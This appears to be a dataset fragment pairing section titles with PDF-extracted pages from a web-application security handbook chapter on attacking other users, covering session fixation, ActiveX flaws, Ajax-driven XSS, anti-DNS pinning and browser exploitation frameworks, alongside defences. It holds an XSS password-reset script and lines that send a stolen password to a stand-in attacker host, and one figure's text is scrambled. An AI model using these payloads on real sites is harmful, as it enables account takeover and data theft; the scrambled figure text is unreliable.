    "output": "70779c12.qxd:WileyRed 9/14/07 3:14 PM Page 450\n450 Chapter 12 ■ Attacking Other Users\nPreventing JSON Hijacking\nAs already described, there are several preconditions that must be in place\nbefore a JSON hijacking attack can be performed. To prevent such attacks, it is\nnecessary to violate at least one of these preconditions.\nAt the time of this writing, each of the following countermeasures should be\nsufficient to frustrate a JSON hijacking attack. However, research into these\nattacks is thriving. To provide defense-in-depth, it is recommended that mul-\ntiple precautions are implemented jointly.\n■■ The application should use standard anti-XSRF defenses to prevent\ncross-domain requests for sensitive data. Requests for JSON objects\nshould include an unpredictable parameter that is verified before the\ndata is returned.\n■■ When an application retrieves JSON objects from its own domain, it is\nnot restricted to using <script>tags to include the objects. Because the\nrequest is on-site, client-side code can use XMLHttpRequestto gain\nunfettered access to the response data and perform additional process-\ning on it before it is interpreted as JavaScript. This means that the appli-\ncation can insert invalid or problematic JavaScript at the start of the\nresponse, which the client application removes before it is processed.\nThis is how Google prevented the attack described against GMail, by\ninserting the following at the start of the returned script:\nwhile(1);\n■■ Because the application can use XMLHttpRequestto retrieve JSON data,\nit can use POSTrequests to do so. If the application accepts only POST\nrequests for JSON objects, it will prevent third-party sites from includ-\ning them via <script>tags.\nSession Fixation\nSession fixation vulnerabilities typically arise when an application creates an\nanonymous session for each user when they first access the application. If the\napplication contains a login function, this anonymous session will be created\nprior to login and then upgraded to an authenticated one after they have\nlogged in. The same token that initially confers no special access later allows\nprivileged access within the security context of the authenticated user.\nIn a standard session hijacking attack, the attacker must use some means to\ncapture the session token of an application user. In a session fixation attack, on\nthe other hand, the attacker first obtains an anonymous token directly from the\n70779c12.qxd:WileyRed 9/14/07 3:14 PM Page 451\nChapter 12 ■ Attacking Other Users 451\napplication, and uses some means to fix this token within a victim’s browser.\nAfter the user has logged in, the attacker can use the token to hijack the user’s\nsession.\nThe steps involved in a successful session fixation attack are illustrated in\nFigure12-10.\nApplication\n3. Use re r c lo ei g v s e d in f r u o s m in g th t e h e a t t t o a k c e k n e r usi 4 n . g A t t h ta e c a s k n 1 a e d . m r i A h s e t i t i j t s a a o s c c k u k k e e s e n r d u a r s a e s e q s r t u e h ’s e s e s s s u t i e o s s s n e s / l r i o t o o g n k i n e n .php\n2. Attacker feeds the session token to the user\nUser Attacker\nFigure12-10: The steps involved in a session fixation attack\nThe key stage in this attack is of course the point at which the attacker feeds\nto the victim the session token that he has acquired, thereby causing the vic-\ntim’s browser to use it. There are various techniques that the attacker may use\nto fix a specific token for a target user, depending upon the mechanism used\nby the application for transmitting session tokens. The two most common\ntechniques are:\n■■ Where an application transmits session tokens within a URL parameter,\nthe attacker can simply feed the victim the same URL that was issued to\nhim by the application, for example:\nhttps://wahh-app.com/login.php?SessId=12d1a1f856ef224ab424c2454208\n■■ Where an application transmits session tokens using HTTP cookies or\nhidden fields in HTML forms, the attacker can exploit a known XSS or\nheader injection vulnerability to set these values within the user’s\n70779c12.qxd:WileyRed 9/14/07 3:14 PM Page 452\n452 Chapter 12 ■ Attacking Other Users\nbrowser. In the case of cookies, this attack will succeed in hijacking the\nuser’s session even against applications that issue HttpOnlycookies,\nand so where cookies cannot be straightforwardly captured via an XSS\nattack.\nIn both of these cases, the same various mechanisms for delivering the\nattack are available as were described previously for reflected XSS.\nSession fixation vulnerabilities can also exist in applications that do not con-\ntain login functionality. For example, an application may allow anonymous\nusers to browse a catalog of products, place items into a shopping cart, check\nout by submitting personal data and payment details, and then review all of\nthis information on a Confirm Order page. In this situation, an attacker may fix\nan anonymous session token with the browser of a victim, wait for that user to\nplace an order and submit sensitive information, and then access the Confirm\nOrder page using the token, to capture the user’s details.\nSome web applications and web servers accept arbitrary tokens submitted\nby users, even if these were not previously issued by the server itself. When an\nunrecognized token is received, the server simply creates a new session for the\ntoken, and handles it exactly as if it were a new token generated by the server.\nMicrosoft IIS and Allaire ColdFusion servers have been vulnerable to this\nweakness in the past.\nWhen an application or server behaves in this way, attacks based on session\nfixation are made considerably easier because the attacker does not need to\ntake any steps to ensure that the tokens fixed in target users’ browsers are cur-\nrently valid. The attacker can simply choose an arbitrary token, distribute this\nas widely as possible (for example, by emailing a URL containing the token to\nindividual users, mailing lists, etc.), and then periodically poll a protected\npage within the application (for example, My Details) to detect when a victim\nhas used the token to log in. Even if a targeted user does not follow the URL\nfor several months, a determined attacker may still be able hijack their session.\nFinding and Exploiting Session Fixation Vulnerabilities\nIf the application supports authentication, you should review how it handles\nsession tokens in relation to the login. There are two ways in which the appli-\ncation may be vulnerable:\n■■ The application issues an anonymous session token to each unauthenti-\ncated user. When the user logs in, no new token is issued—rather, their\nexisting session is upgraded to an authenticated session. This behavior\nis common when the application uses the application server’s default\nsession-handling mechanism.\n70779c12.qxd:WileyRed 9/14/07 3:14 PM Page 453\nChapter 12 ■ Attacking Other Users 453\n■■ The application does not issue tokens to anonymous users, and a token\nis issued only following a successful login. However, if a user accesses\nthe login function using an authenticated token, and logs in using dif-\nferent credentials, no new token is issued—rather, the user associated\nwith the previously authenticated session is changed to the identity of\nthe second user.\nIn both of these cases, an attacker can obtain a valid session token (either by\nsimply requesting the login page or by performing a login with his own cre-\ndentials) and feed this to a target user. When that user logs in using the token,\nthe attacker can hijack the user’s session.\nHACK STEPS\n■ Obtain a valid token, by whatever means the application enables you to\nobtain one.\n■ Access the login form and perform a login using this token.\n■ If the login is successful and the application does not issue a new token,\nthen it is vulnerable to session fixation.\nIf the application does not support authentication, but does allow users to\nsubmit and then review sensitive information, you should verify whether the\nsame session token is used before and after the initial submission of user-spe-\ncific information. If so, then an attacker can obtain a token and feed this to a\ntarget user. When the user submits sensitive details, the attacker can use the\ntoken to view the user’s information.\nHACK STEPS\n■ Obtain a session token as a completely anonymous user, and then walk\nthrough the process of submitting sensitive data, up until any page at\nwhich the sensitive data is displayed back.\n■ If the same token originally obtained can now be used to retrieve the\nsensitive data, then the application is vulnerable to session fixation.\n■ If any type of session fixation is identified, verify whether the server\naccepts arbitrary tokens it has not previously issued. If so, the vulnerabil-\nity is considerably easier to exploit over an extended period.\nPreventing Session Fixation Vulnerabilities\nAt any point at which a user interacting with the application transitions from\nbeing anonymous to being identified, the application should issue a fresh session"
  },
  {
    "input": "Attacking ActiveX Controls",
    "output": "70779c12.qxd:WileyRed 9/14/07 3:14 PM Page 454\n454 Chapter 12 ■ Attacking Other Users\ntoken. This applies both to a successful login and to cases where an anonymous\nuser first submits personal or other sensitive information.\nAs a defense-in-depth measure to further protect against session fixation\nattacks, many security-critical applications employ per-page tokens to supple-\nment the main session token. This technique can frustrate most kinds of ses-\nsion hijacking attacks—see Chapter 7 for further details.\nThe application should not accept arbitrary session tokens that it does not\nrecognize as having issued itself. The token should be immediately canceled\nwithin the browser, and the user should be returned to the start page of the\napplication.\nAttacking ActiveX Controls\nWe described in Chapter 5 how applications can use various thick-client tech-\nnologies to distribute some of the application’s processing to the client side.\nActiveX controls are of particular interest to an attacker who is targeting other\nusers. When an application installs a control in order to invoke it from its own\npages, the control must be registered as “safe for scripting.” Once this has\noccurred, any other web site accessed by the user can make use of that control.\nBrowsers do not accept just any ActiveX control that a web site requests\nthem to install. By default, when a web site seeks to install a control, the\nbrowser presents a security warning and asks the user for permission. The\nuser can decide whether or not they trust the web site issuing the control, and\nallow it to be installed accordingly. However, if they do so, and the control con-\ntains any vulnerabilities, these can be exploited by any malicious web site vis-\nited by the user.\nThere are two main categories of vulnerability commonly found within\nActiveX controls that are of interest to an attacker:\n■■ Because ActiveX controls are typically written in native languages such\nas C/C++, they are at risk from classic software vulnerabilities such as\nbuffer overflows, integer bugs, and format string flaws (see Chapter 15\nfor more details). In recent years, a huge number of these vulnerabilities\nhave been identified within the ActiveX controls issued by popular web\napplications, such as online gaming sites. These vulnerabilities can nor-\nmally be exploited to cause arbitrary code execution on the computer of\nthe victim user.\n■■ Many ActiveX controls contain methods that are inherently dangerous\nand vulnerable to misuse. For example:\n■■ LaunchExe(BSTR ExeName)\n■■ SaveFile(BSTR FileName, BSTR Url)\n70779c12.qxd:WileyRed 9/14/07 3:14 PM Page 455\nChapter 12 ■ Attacking Other Users 455\n■■ LoadLibrary(BSTR LibraryPath)\n■■ ExecuteCommand(BSTR Command)\nMethods like these are usually implemented by developers in order to build\nsome flexibility into their control, enabling them to extend its functionality in\nfuture without needing to deploy a fresh control altogether. However, once the\ncontrol is installed, it can of course be “extended” in the same way by any\nmalicious web site in order to carry out undesirable actions against the user.\nFinding ActiveX Vulnerabilities\nWhen an application installs an ActiveX control, in addition to the browser\nalert asking your permission to install it, you should see code similar to the fol-\nlowing within the HTML source of an application page:\n<object id=”oMyObject”\nclassid=”CLSID:A61BC839-5188-4AE9-76AF-109016FD8901”\ncodebase=”https://wahh-app.com/bin/myobject.cab”>\n</object>\nThis code tells the browser to instantiate an ActiveX control with the speci-\nfied name and classid, and to download the control from the specified URL.\nIf a control is already installed, the codebaseparameter is not required, and the\nbrowser will locate the control from the local computer, based on its unique\nclassid.\nIf a user gives permission to install the control, then the browser registers it\nas “safe for scripting.” This means that it can be instantiated, and its methods\ninvoked, by any web site in the future. To verify for sure that this has been\ndone, you can check the registry key HKEY_CLASSES_ROOT\\CLSID\\{classid of\ncontrol taken from above HTML}\\Implemented Categories. If the subkey\n7DD95801-9882-11CF-9FA9-00AA006C42C4is present, then the control has been\nregistered as “safe for scripting,” as illustrated in Figure12-11.\nFigure12-11: A control registered as safe for scripting\n70779c12.qxd:WileyRed 9/14/07 3:14 PM Page 456\n456 Chapter 12 ■ Attacking Other Users\nWhen an ActiveX control has been instantiated by the browser, individual\nmethods can be invoked as follows:\n<script>\ndocument.oMyObject.LaunchExe(‘myAppDemo.exe’);\n</script>\nHACK STEPS\nA simple way to probe for ActiveX vulnerabilities is to modify the HTML that\ninvokes the control, pass your own parameters to it, and monitor the results:\n■ Vulnerabilities such as buffer overflows can be probed for using the\nsame kind of attack payloads as are described in Chapter 15. Triggering\nbugs of this kind in an uncontrolled manner is mostly likely to result in a\ncrash of the browser process that is hosting the control.\n■ Inherently dangerous methods such as LaunchExecan often be identi-\nfied simply by their name. In other cases, the name may be innocuous or\nobfuscated, but it may be clear that interesting items such as file names,\nURLs, or system commands are being passed as parameters. You should\ntry modifying these parameters to arbitrary values and determine\nwhether the control processes your input as expected.\nIt is common to find that not all of the methods implemented by a control\nare actually invoked anywhere within the application. For example, methods\nmay have been implemented for testing purposes, may have been superseded\nbut not removed, or may exist for future use or self-updating purposes. To per-\nform a comprehensive test of a control, it is necessary to enumerate all of the\nattack surface it exposes through these methods, and test all of them.\nVarious tools exist for enumerating and testing the methods exposed by\nActiveX controls. One useful tool is COMRaider by iDefense, which can dis-\nplay all of a control’s methods and perform basic fuzz testing of each, as\nshown in Figure12-12.\nPreventing ActiveX Vulnerabilities\nDefending compiled software components against attack is a large and complex\narea, and goes beyond the scope of this book. Basically,the designers and devel-\nopers of an ActiveX control must ensure that the methods that it implements\n70779c12.qxd:WileyRed 9/14/07 3:14 PM Page 457\nChapter 12 ■ Attacking Other Users 457\nFigure12-12: COMRaider showing the methods of an ActiveX control\ncannot be invoked by a malicious web site to carry out undesirable actions\nagainst a user who has installed it. For example:\n■■ A security-focused source code review and penetration test should be car-\nried out on the control to locate vulnerabilities such as buffer overflows.\n■■ The control should not expose any inherently dangerous methods that\ncall out to the file system or operating system using user-controllable\ninput. Safer alternatives are usually available with minimal extra effort.\nFor example, if it is considered necessary to launch external processes,\ncompile a list of all the external processes that may legitimately and\nsafely be launched, and either create a separate method to call each one\nor use a single method that takes an index number into this list.\nAs an additional defense-in-depth precaution, some ActiveX controls vali-\ndate the domain name that issued the HTML page from which they are being\ninvoked. Some controls go even further than this, and require that all parame-\nters passed to the control must be cryptographically signed. If an unautho-\nrized domain attempts to invoke the control, or the signature passed is invalid,\nthe control does not carry out the requested action. You should be aware that\nsome defenses of this kind can be circumvented if the web site that is permit-\nted to invoke the control contains any XSS vulnerabilities."
  },
  {
    "input": "Local Privacy Attacks",
    "output": "70779c12.qxd:WileyRed 9/14/07 3:14 PM Page 458\n458 Chapter 12 ■ Attacking Other Users\nLocal Privacy Attacks\nMany users access web applications from a shared environment in which an\nattacker may have direct access to the same computer as the user. This gives\nrise to a range of attacks to which insecure applications may leave their users\nvulnerable. There are several areas in which this kind of attack may arise.\nPersistent Cookies\nSome applications store sensitive data in a persistent cookie, which most\nbrowsers save on the local file system.\nHACK STEPS\n■ Review all of the cookies identified during your application mapping\nexercises (see Chapter 4). If any Set-cookieinstruction contained an\nexpiresattribute with a date that is in the future, this will cause the\nbrowser to persist that cookie until that date. For example:\nUID=d475dfc6eccca72d0e expires=Wed, 12-Mar-08 16:08:29 GMT;\n■ If a persistent cookie is set that contains any sensitive data, then a local\nattacker may be able to capture this data. Even if a persistent cookie con-\ntains an encrypted value, if this plays a critical role such as reauthenticat-\ning the user without entering credentials, then an attacker who captures\nit will be able to resubmit it to the application without actually decipher-\ning its contents (see Chapter 6).\nCached Web Content\nMost browsers cache non-SSL web content unless a web site specifically\ninstructs them not to. The cached data is normally stored on the local file system.\nHACK STEPS\n■ For any application pages which are accessed over HTTP and which con-\ntain sensitive data, review the details of the server’s response to identify\nany cache directives.\n70779c12.qxd:WileyRed 9/14/07 3:14 PM Page 459\nChapter 12 ■ Attacking Other Users 459\nHACK STEPS (continued)\n■ The following directives will prevent browsers from caching a page. Note\nthat these may be specified within the HTTP response headers or within\nHTML meta-tags:\nExpires: 0\nCache-control: no-cache\nPragma: no-cache\n■ If these directives are not found, then the page concerned may be vulner-\nable to caching by one or more browsers. Note that cache directives are\nprocessed on a per-page basis, and so every sensitive HTTP-based page\nneeds to be checked.\n■ To verify that sensitive information is being cached, use a default instal-\nlation of a standard browser, such as Internet Explorer or Firefox. In the\nbrowser’s configuration, completely clean its cache and all cookies, and\nthen access the application pages that contain sensitive data. Review the\nfiles that have appeared in the cache to see if any of these contain sensi-\ntive data. If a large number of files are being generated, you can take a\nspecific string from a page’s source, and search the cache for that string.\n■ The default cache locations for common browsers are:\n■ Internet Explorer: Subdirectories of C:\\Documents and Settings\\\n{username}\\Local Settings\\Temporary Internet Files\\\nContent.IE5\nNote that in Windows Explorer, to view this folder you need to enter this\nexact path and have hidden folders showing, or browse to the above\nfolder from the command line.\n■ Firefox (on Windows): C:\\Documents and Settings\\\n{username}\\Local Settings\\Application Data\\Mozilla\\\nFirefox\\Profiles\\{profile name}\\Cache\n■ Firefox (on Linux): ~/.mozilla/firefox/{profile name}/Cache\nBrowsing History\nMost browsers save a browsing history, which may include any sensitive data\ntransmitted in URL parameters.\nHACK STEPS\n■ Identify any instances within the application in which sensitive data is\nbeing transmitted via a URL parameter.\n■ If any cases exist, examine the browser history to verify that this data has\nbeen stored there.\n70779c12.qxd:WileyRed 9/14/07 3:14 PM Page 460\n460 Chapter 12 ■ Attacking Other Users\nAutocomplete\nMany browsers implement a user-configurable autocomplete function for\ntext-based input fields, which may store sensitive data such as credit card\nnumbers, usernames, and passwords. Autocomplete data is stored within the\nregistry by Internet Explorer and on the file system by Firefox.\nAs already described, in addition to being accessible by local attackers, data\nin the autocomplete cache can also be retrieved via an XSS attack in certain cir-\ncumstances.\nHACK STEPS\n■ Review the HTML source code for any forms that contain text fields in\nwhich sensitive data is captured.\n■ If the attribute autocomplete=offis not set, either within the form tag\nor the tag for the individual input field, then data entered will be stored\nwithin browsers where autocomplete is enabled.\nPreventing Local Privacy Attacks\nApplications should avoid storing anything sensitive in a persistent cookie.\nEven if this data is encrypted, it can be resubmitted by an attacker who cap-\ntures it.\nApplications should use suitable cache directives to prevent sensitive data\nfrom being stored by browsers. In ASP applications, the following instructions\nwill cause the server to include the required directives:\n<% Response.CacheControl = “no-cache” %>\n<% Response.AddHeader “Pragma”, “no-cache” %>\n<% Response.Expires = 0 %>\nIn Java applications, the following commands should achieve the same\nresult:\n<%\nresponse.setHeader(“Cache-Control”,”no-cache”);\nresponse.setHeader(“Pragma”,”no-cache”);\nresponse.setDateHeader (“Expires”, 0);\n%>\nApplications should never use URLs to transmit sensitive data, as these are\nliable to be logged in numerous locations. All such data should be transmitted\nusing HTML forms that are submitted using the POSTmethod."
  },
  {
    "input": "Advanced Exploitation Techniques",
    "output": "70779c12.qxd:WileyRed 9/14/07 3:14 PM Page 461\nChapter 12 ■ Attacking Other Users 461\nIn any instance where users enter sensitive data into text input fields, the\nautocomplete=offattribute should be specified within the form or field tag.\nAdvanced Exploitation Techniques\nThis section does not describe any new categories of vulnerability that arise\nwithin web applications. Rather, it describes some advanced techniques that may\nbe employed in the course of exploiting the vulnerabilities already examined.\nLeveraging Ajax\nWe described earlier how Ajax techniques can be used to implement sophisti-\ncated user interfaces that behave more like local desktop software than older\nweb applications ever could.\nThe ability of Ajax to carry out actions behind the scenes in a flexible and\npowerful way makes it extremely attractive to someone seeking to attack other\nusers of an application. If an attacker has the ability to execute arbitrary\nJavaScript within the browser of a victim user (for example, via an XSS vul-\nnerability), then he can use Ajax techniques to perform arbitrarily complex\nactions involving multiple requests to the vulnerable application.\nYou have already seen XMLHttpRequest being used to generate a TRACE\nrequest to a web application that employed HttpOnly cookies. The following\nexample shows a more sophisticated attack in which two requests are made to\nperform an action on behalf of a victim user. Suppose that a web application\nallows authenticated users to view and update their account details, including\ntheir current password, which is masked on-screen. If the application contains\nan XSS flaw anywhere within its functionality, then an attacker can inject the\nfollowing script to reset the user’s password:\n<script>\nvar request = new ActiveXObject(“Microsoft.XMLHTTP”);\nrequest.open(“GET”, “http://wahh-app.com/ShowAccount.php”, false);\nrequest.send();\nvar password = request.responseText.substring(\nrequest.responseText.indexOf(“password\\“ value=\\“”) + 17);\npassword = password.substring(0, password.indexOf(“\\“”));\nrequest = new ActiveXObject(“Microsoft.XMLHTTP”);\nrequest.open(“POST”, “http://wahh-app.com/ChangePasswd.php”, false);\nrequest.send(“oldPassword=” + password +\n“&newPassword=0wned&confirmPassword=0wned”);\n</script>\n70779c12.qxd:WileyRed 9/14/07 3:14 PM Page 462\n462 Chapter 12 ■ Attacking Other Users\nWhen this script is executed, the victim’s browser will first issue the follow-\ning request:\nGET /ShowAccount.php HTTP/1.1\nHost: wahh-app.com\nwhich returns a form including the following field:\n<input type=”password” name=”password” value=”kemppike”>\nThe script then parses out the value of the password field and causes the vic-\ntim’s browser to issue the following request:\nPOST /ChangePassword.php HTTP/1.1\nHost: wahh-app.com\nContent-Length: 60\noldPassword=kemppike&newPassword=0wned&confirmPassword=0wned\nwhich results in the user’s password being reset to a value controlled by the\nattacker. Each of these requests occurs asynchronously, without any obvious\nindication to the user that they have taken place. If skillfully executed, the user\nwill not know about the attack until the next time they attempt to log in.\nNOTE The example script shown works on Internet Explorer. A slightly more\ncomplicated script could be created that worked on all common browsers.\nThe MySpace worm, which exploited a stored XSS vulnerability, employed\nAjax techniques, and provides a useful example of the kind of complex opera-\ntions that can be carried out using this technology. The steps performed by the\nworm’s payload included the following:\n1. Parse the source code of the current page to extract the ID of the\nMySpace user who is viewing it.\n2. If the current page was issued by the domain profile.myspace.com,\nswitch the location to www.myspace.comwith the same relative URL.\n(The profile.myspace.comdomain can only be used to view profiles,\nwhile the www.myspace.comdomain can also be used to add new friends\nand perform other tasks. Because XMLHttpRequestcan only be used to\nmake requests to the same domain that issued it, it is necessary to\nswitch domain before issuing requests to add friends.)\n3. Parse the current page to extract the worm’s own source code, and\nURL-encode it.\n4. Make a GETrequest to the user’s Add Friend page to extract the per-\npage token that it contains.\n70779c12.qxd:WileyRed 9/14/07 3:14 PM Page 463\nChapter 12 ■ Attacking Other Users 463\n5. Make a POSTrequest (including the per-page token) to the user’s Add\nFriend page to add the worm’s author as a friend.\n6. Make a GETrequest to the user’s Add Hero page to extract the per-page\ntoken that it contains.\n7 Make a POSTrequest (including the per-page token) to the user’s Add\nHero page to add the worm’s author as a hero and also embed the\nsource code for the worm itself, so that it will propagate when other\npeople view the user’s profile.\nMaking Asynchronous Off-Site Requests\nThe browser’s same origin policy prevents XMLHttpRequest from being used\nto make off-site requests, because this would enable a malicious web site to\nretrieve and process data from other domains. Hence, in the earlier example,\nthe attacker could not use XMLHttpRequestto submit the user’s existing pass-\nword out to an external server which he controls. However, this restriction can\nbe circumvented by supplementing Ajax with other techniques.\nThere are numerous ways in which an injected script may cause arbitrary\ncaptured data to be submitted to an external server. To generate a single\nrequest, an image tag can be created with an arbitrary source URL. For exam-\nple, having parsed out the victim’s password from the account details page,\nthe attacker can transmit this to his server using the following JavaScript:\ndocument.write(“<img src=\\“http://wahh-attacker.com/“+password+”\\“>”);\nBy creating numerous such tags programmatically, it is possible to generate\nasynchronous requests to an external server. Another way for an attacker to do\nthis is to call out to a Java applet from his injected code. For example, the\nattacker can create an applet that implements the following method:\nimport java.io.*;\nimport java.net.*;\npublic String phoneHome(String data)\n{\ntry\n{\nURLConnection urlConn = new URL(\n“http://wahh-attacker.com/phonehome”).openConnection();\nurlConn.setDoOutput(true);\nurlConn.setRequestProperty (“Content-Type”,\n“application/x-www-form-urlencoded”);\nDataOutputStream dos = new DataOutputStream(\n70779c12.qxd:WileyRed 9/14/07 3:14 PM Page 464\n464 Chapter 12 ■ Attacking Other Users\nurlConn.getOutputStream ());\ndos.writeBytes(data);\ndos.flush();\ndos.close();\nDataInputStream input = new DataInputStream(\nurlConn.getInputStream ());\n}\ncatch (Exception e)\n{\nreturn e.getMessage();\n}\nreturn “data sent”;\n}\nThis method accepts an arbitrary String as input, and generates a POST\nrequest to the attacker’s server, containing this data.\nThe attacker can cause the victim’s browser to load the applet by inserting\nthe following HTML before his malicious script:\n<applet codebase=”http://wahh-attacker.com” code=”PhoneHome.class”\nid=”theApplet”></applet>\nThe applet can then be invoked from the attacker’s script to issue asynchro-\nnous requests, as follows:\ntheApplet.phoneHome(password);\nDespite the various security restrictions imposed by the browser’s same ori-\ngin policy, this technique is successful because:\n■■ HTML documents may load Java applets from any domain.\n■■ The applet is loaded from wahh-attacker.comand only ever communi-\ncates back to wahh-attacker.com.\n■■ XMLHttpRequestis only ever used to communicate to wahh-app.com,\nfrom where the attacker’s script was loaded.\n■■ Any JavaScript on an HTML page may invoke the public methods of\nany applet loaded by the page.\nAnti-DNS Pinning\nAnti-DNS pinning is a technique that can be used to perform a partial breach\nof same origin restrictions in some situations, enabling a malicious web site to\ninteract with a different domain.\n70779c12.qxd:WileyRed 9/14/07 3:14 PM Page 465\nChapter 12 ■ Attacking Other Users 465\nA Hypothetical Attack\nTo understand what DNS pinning is, and why it is necessary, let us first imag-\nine a world in which it does not exist. Suppose that a malicious web site wishes\nto retrieve and process data from a different domain. Without DNS pinning,\nthis attack could be achieved through the following steps:\n1. An unwitting user follows a link to the URL http://wahh-attacker.com/.\n2. The user’s browser resolves the domain name wahh-attacker.com. To\ndo this, it performs a DNS lookup on the attacker’s name server. The\nname server responds with the IP address of the attacker’s web server\n(1.2.3.4), with a time to live (TTL) of one second.\n3. The user’s browser issues the following request to IP address 1.2.3.4:\nGET / HTTP/1.1\nHost: wahh-attacker.com\n4. The attacker’s web server returns a page containing a script that waits\nfor two seconds and then performs two actions. The first action is to use\nXMLHttpRequestto retrieve http://wahh-attacker.com/. Because this\nis the same domain that invoked the script, the request is permitted.\n5. Because the browser has waited for two seconds, its previous DNS\nlookup on wahh-attacker.comhas now expired, and so the browser\nperforms a second lookup. This time, the attacker’s name server\nresponds with the IP address of wahh-app.com, which is 5.6.7.8.\n6. The user’s browser issues the following request to IP address 5.6.7.8:\nGET / HTTP/1.1\nHost: wahh-attacker.com\n7. The wahh-app.comserver responds with its content, which the\nattacker’s script is able to process via the XMLHttpRequestobject.\n8. The attacker’s script loaded in step 4 performs its second action, which\nis to transmit the data retrieved in step 7 to a location controlled by the\nattacker. Recall that any web site can issue a request to any other\ndomain, and in this case, the attacker’s script posts the captured data to\nwww2.wahh-attacker.comin the standard way.\nThe hypothetical attack just described succeeds in retrieving data across\ndomains; however, it only constitutes a partial breach of the browser’s same\norigin policy. Crucially, in step 3 the user’s browser believes it is submitting a\nrequest to the domain wahh-attacker.com, and this is the context in which the\nrequest is made. Any cookies that the user has for the domain wahh-app.com,\n70779c12.qxd:WileyRed 9/14/07 3:14 PM Page 466\n466 Chapter 12 ■ Attacking Other Users\nsuch as session tokens, are not transmitted. This means that the content\nretrieved in the attack will be the same as if the attacker had simply visited\nhttp://wahh-app.com/directly himself.\nSo what does the attack achieve? It is effective in retrieving content from\nweb sites which the user can access but which the attacker cannot. If the user\nis on a corporate LAN, the attacker will be able to browse intranet sites on the\nLAN. If the user is on a home DSL connection, the attacker will be able to com-\nmunicate with the administrative interface on their router, which listens only\non the internal home network. The attacker can also interact with any web-\nbased services on the user’s own computer, even if these are protected by a\npersonal firewall. In these situations, the attacker can reach servers that are\ndefended by the network topology rather than by authentication and sessions.\nA sophisticated attack could turn the user’s browser into an open proxy, allow-\ning the attacker to capture data from, and perform arbitrary actions against,\narbitrary targets. In many contexts, this could be a very serious threat.\nDNS Pinning\nIt is specifically to prevent this kind of attack that DNS pinning exists. When\nbrowsers resolve a domain name to an IP address, they cache the IP address\nfor the duration of the current browser session, regardless of the TTL value\nspecified in the response to the lookup. Hence, in step 5 of the hypothetical\nattack, the browser will continue to associate wahh-attacker.com with the\noriginal IP address 1.2.3.4, and so does not make any request to the server at\nwahh-app.com. So the attack was only hypothetical after all.\nAttacks against DNS Pinning\nOr was it?\nIn August 2006, Martin Johns discovered that DNS pinning can be defeated\nby rejecting HTTP connections. In step 5 of the attack, the user’s browser\nenforces DNS pinning and so makes the subsequent request to the original IP\naddress 1.2.3.4, However, if the attacker’s server rejects this connection\nattempt (for example, by firewalling its HTTP port), then the user’s browser\ndrops the DNS pinning and performs a fresh lookup on wahh-attacker.com.\nAt this point, the attacker responds with the IP address 5.6.7.8and the attack\nproceeds as originally described. This behavior means that the protection\noffered by DNS pinning can be trivially defeated by any serious attacker.\nA second defect in the reliance on DNS pinning defenses is that they do not\nprotect users who access the Internet via a proxy server. In this situation, DNS\nresolution is performed by the proxy, not the browser. Hence, browser-based\n70779c12.qxd:WileyRed 9/14/07 3:14 PM Page 467\nChapter 12 ■ Attacking Other Users 467\nDNS pinning is irrelevant, and the hypothetical attack originally described is\nfully effective. For further details, see the following paper:\nhttp://www.ngssoftware.com/research/papers/\nDnsPinningAndWebProxies.pdf\nA further twist in the DNS pinning story relates to the HTTP Host header.\nNotice that in step 6, the request to the wahh-app.comweb server contains the\ndomain wahh-attacker.comin its Hostheader, because the user’s browser still\nbelieves it is accessing the attacker’s domain. This means that web sites could\nseek to defend against anti-DNS pinning by checking the Host header in all\nrequests and rejecting those specifying a different domain. However, an\nattacker can spoof an arbitrary Host header in various ways, both via XML-\nHttpRequest itself on older browsers or through older versions of Flash.\nHence, checking the Hostheader should not be considered a reliable means of\nthwarting anti-DNS pinning attacks. The only failsafe method is to ensure that\nsensitive web content is protected by effective authentication and sessions,\nregardless of any defenses imposed by the network topology.\nNote that because an attacker performing anti-DNS pinning can gain full\ntwo-way interaction with a target web application, he can perform any of the\nattacks that are possible against applications on the public Internet. Hence,\norganizations hosting applications internally on protected networks should\nensure that they are robustly defended against common web application\nattacks, in the same way as if those applications were accessible directly from\nthe Internet.\nBrowser Exploitation Frameworks\nVarious frameworks have been developed to demonstrate and exploit the vari-\nety of possible attacks that may be carried out against end users on the Inter-\nnet. These typically require a JavaScript hook to be placed into the browser of\na victim, via some vulnerability such as XSS. Once the hook is in place, the\nbrowser contacts a server controlled by the attacker, and may poll this server\nperiodically, submitting data back to the attacker and providing a control\nchannel for receiving commands from the attacker.\nActions which may be carried out within this type of framework include the\nfollowing:\n■■ Logging keystrokes and sending these to the attacker.\n■■ Capturing clipboard contents and sending these to the attacker.\n■■ Hijacking the user’s session with the vulnerable application.\n■■ Fingerprinting the victim’s browser and exploiting known browser vul-\nnerabilities accordingly.\n70779c12.qxd:WileyRed 9/14/07 3:14 PM Page 468\n468 Chapter 12 ■ Attacking Other Users\n■■ Performing port scans of other hosts (which may be on a private net-\nwork accessible by the compromised user browser), and sending the\nresults to the attacker.\n■■ Attacking other web applications accessible via the compromised user’s\nbrowser, by forcing the browser to send malicious requests.\n■■ Brute forcing the user’s browsing history and sending this to the\nattacker.\nOne example of a sophisticated browser exploitation framework is BeEF,\nwhich was developed by Wade Alcon and implements the preceding func-\ntionality. Figure12-13 shows BeEF capturing information from a compromised\nuser, including computer details, the URL and page content currently dis-\nplayed, and keystrokes entered by the user.\nFigure12-13: Data captured from a compromised user by BeEF\nFigure 12-14 shows BeEF performing a port scan of the victim user’s own\ncomputer.\nFigure12-14: BeEF performing a port scan of a compromised user’s computer"
  },
  {
    "input": "Questions",
    "output": "70779c12.qxd:WileyRed 9/14/07 3:14 PM Page 469\nChapter 12 ■ Attacking Other Users 469\nAnother highly functional browser exploitation framework is XSS Shell, pro-\nduced by SecuriTeam. This provides a wide range of functions for manipulat-\ning zombie hosts compromised via XSS, including capturing of keystrokes,\nclipboard contents, mouse movements, screenshots, and URL history, as well as\nthe injection of arbitrary JavaScript commands. It also remains resident within\nthe user’s browser if she navigates to other pages within the application.\nChapter Summary\nWe have examined a huge variety of ways in which defects in a server-side\nweb application may leave its users exposed to malicious attack. Many of\nthese vulnerabilities are complex to understand and discover, and often neces-\nsitate an amount of investigative effort that exceeds their actual significance as\nthe basis for a worthwhile attack. Nevertheless, it is common to find that lurk-\ning among a large number of uninteresting client-side flaws is a serious vul-\nnerability that can be leveraged to attack the application itself. In many cases,\nthe effort is worth it.\nFurther, as awareness of web application security continues to evolve, direct\nattacks against the server component itself are likely to become less straight-\nforward to discover or to execute. Attacks against other users, for better or\nworse, are certainly part of everyone’s future.\nQuestions\nAnswers can be found at www.wiley.com/go/webhacker.\n1. What is the standard “signature” in an application’s behavior that can\nbe used to identify most 